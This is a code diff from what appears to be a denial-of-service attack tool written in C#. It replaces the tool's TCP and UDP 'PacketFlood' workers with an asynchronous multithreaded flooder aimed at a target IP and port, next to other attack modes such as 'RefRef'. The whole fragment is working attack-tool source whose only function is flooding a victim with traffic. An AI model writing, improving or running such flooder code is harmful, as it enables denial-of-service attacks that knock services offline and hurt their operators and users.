@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Net;
+using System.Net.Sockets;
 using GAS.Core.AttackInformation;
 using GAS.Core.Attacks;
 
@@ -103,28 +104,14 @@ namespace GAS.Core {
                         this.Threads );
                     break;
                 case AttackMethod.TCP:
-                    this.Worker = new PacketFlood(
-                        this.Target.ToString(),
-                        this.Port,
-                        1,
-                        this.Delay,
-                        this.WaitForResponse,
-                        this.Data,
-                        this.AppendRandomChars,
-                        this.Threads,
-                        this.Spt );
-                    break;
                 case AttackMethod.UDP:
-                    this.Worker = new PacketFlood(
-                        this.Target.ToString(),
-                        this.Port,
-                        2,
-                        this.Delay,
-                        this.WaitForResponse,
-                        this.Data,
-                        this.AppendRandomChars,
-                        this.Threads,
-                        this.Spt );
+                    this.Worker= new AsyncFlooderWrapper(
+                        new IPEndPoint( this.Target, this.Port ),
+                        this.Method == AttackMethod.TCP
+                            ? ProtocolType.Tcp
+                            : ProtocolType.Udp,
+                        this.Threads
+                    );
                     break;
                 case AttackMethod.RefRef:
                     this.Subsite +=
